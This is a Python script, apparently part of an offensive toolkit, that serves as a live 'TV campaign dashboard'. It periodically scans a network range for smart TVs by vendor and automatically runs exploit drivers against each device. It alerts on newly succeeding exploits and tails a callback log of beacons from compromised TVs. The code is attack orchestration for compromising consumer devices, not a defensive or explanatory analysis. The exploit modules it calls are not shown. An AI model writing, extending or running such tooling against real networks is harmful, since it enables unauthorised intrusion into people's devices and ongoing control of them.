#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
watch.py — live campaign dashboard: periodic re-sweep + live beacon tail.

Alerts on NEW devices and NEWLY-succeeding exploits. Tails callback.log so
TVs checking in appear in real time.

  python3 watch.py --interval 30
  python3 watch.py --cidr 192.168.1.0/24 --only roku,vizio --interval 60
"""
import argparse, collections, os, threading, time
from datetime import datetime
from pathlib import Path

import tv_sweep as ts

ROOT = Path(__file__).resolve().parent
CALLBACK_LOG = ROOT / "callback.log"

GREEN, YELLOW, CYAN, DIM, RED, BOLD, RST = (
    "\033[92m", "\033[93m", "\033[96m", "\033[2m", "\033[91m", "\033[1m", "\033[0m")


class Watcher:
    def __init__(self, cidr, interval=30, only=None, callbacks=True):
        self.cidr = cidr
        self.interval = interval
        self.only = set(only.split(",")) if only else None
        self.watch_callbacks = callbacks

        self.known_devices = {}                 # ip -> {vendor, first_seen}
        self.successes = set()                  # (ip, cve)
        self.alerts = collections.deque(maxlen=12)
        self.beacons = collections.deque(maxlen=12)
        self.cycle = 0
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._logpos = 0

    # -- alerts ------------------------------------------------------------
    def _alert(self, kind, msg):
        entry = f"{datetime.now():%H:%M:%S} {kind} {msg}"
        with self._lock:
            self.alerts.appendleft(entry)
        print(f"\a{entry}")                    # bell on alert

    # -- callback tail -----------------------------------------------------
    def _tail_loop(self):
        if not CALLBACK_LOG.exists():
            CALLBACK_LOG.touch()
        self._logpos = CALLBACK_LOG.stat().st_size
        while not self._stop.is_set():
            try:
                size = CALLBACK_LOG.stat().st_size
                if size > self._logpos:
                    with open(CALLBACK_LOG) as f:
                        f.seek(self._logpos)
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                            try:
                                rec = __import__("json").loads(line)
                                entry = (f"{rec.get('ts','')[11:19]} {CYAN}{rec['src']:<15}{RST} "
                                         f"{rec['kind']}: {rec['data'][:60]}")
                                with self._lock:
                                    self.beacons.appendleft(entry)
                            except Exception:
                                pass
                        self._logpos = size
                elif size < self._logpos:          # log rotated
                    self._logpos = 0
            except OSError:
                pass
            time.sleep(1.0)

    # -- one sweep ---------------------------------------------------------
    def _sweep_once(self):
        try:
            found = ts.scan_network(self.cidr)
        except Exception as e:
            self._alert(f"{RED}scan error{RST}", str(e)); return

        for f in found:
            ip, vendor = f["ip"], f["vendor"]
            if self.only and vendor not in self.only:
                continue
            if ip not in self.known_devices:
                self.known_devices[ip] = {"vendor": vendor, "first_seen": datetime.now()}
                self._alert(f"{YELLOW}[NEW DEVICE]{RST}",
                            f"{ip} {vendor} ({f['confidence']})")

            # run drivers, capture new successes
            for name in ts.DRIVERS.get(vendor, []):
                key = (ip, name)
                if key in self.successes:
                    continue
                mod = ts._load(name)
                if mod is None or not hasattr(mod, "exploit"):
                    continue
                try:
                    r = mod.exploit(ip)
                    if r not in (None, False, 0):
                        self.successes.add(key)
                        self._alert(f"{GREEN}[NEW SUCCESS]{RST}", f"{ip} {name}")
                except Exception:
                    pass

    # -- dashboard ---------------------------------------------------------
    def _render(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(f"{BOLD}{CYAN} TV CAMPAIGN DASHBOARD {RST}  {datetime.now():%Y-%m-%d %H:%M:%S}")
        print(f"{DIM}cidr={self.cidr}  interval={self.interval}s  cycle={self.cycle}{RST}")
        print()
        print(f"{BOLD}Known devices:{RST}")
        for ip, info in sorted(self.known_devices.items()):
            print(f"  {ip:<15} {info['vendor']:<11} (since {info['first_seen']:%H:%M:%S})")
        print()
        print(f"{BOLD}Alerts:{RST}")
        for a in self.alerts:
            print(f"  {a}")
        print()
        print(f"{BOLD}Beacons:{RST}")
        for b in self.beacons:
            print(f"  {b}")
        print()
        print(f"{DIM}Ctrl-C to stop{RST}")

    # -- main loop ---------------------------------------------------------
    def run(self):
        if self.watch_callbacks:
            t = threading.Thread(target=self._tail_loop, daemon=True)
            t.start()

        while not self._stop.is_set():
            self.cycle += 1
            self._sweep_once()
            self._render()
            time.sleep(self.interval)

    def stop(self):
        self._stop.set()


def main():
    ap = argparse.ArgumentParser(prog="watch")
    ap.add_argument("--cidr", default=None)
    ap.add_argument("--interval", type=int, default=30)
    ap.add_argument("--only", default=None)
    ap.add_argument("--no-callbacks", action="store_true")
    a = ap.parse_args()

    cidr = a.cidr or ts.local_cidr()
    w = Watcher(cidr, a.interval, a.only, callbacks=not a.no_callbacks)
    try:
        w.run()
    except KeyboardInterrupt:
        w.stop()
        print("\n[*] stopped")


if __name__ == "__main__":
    main()
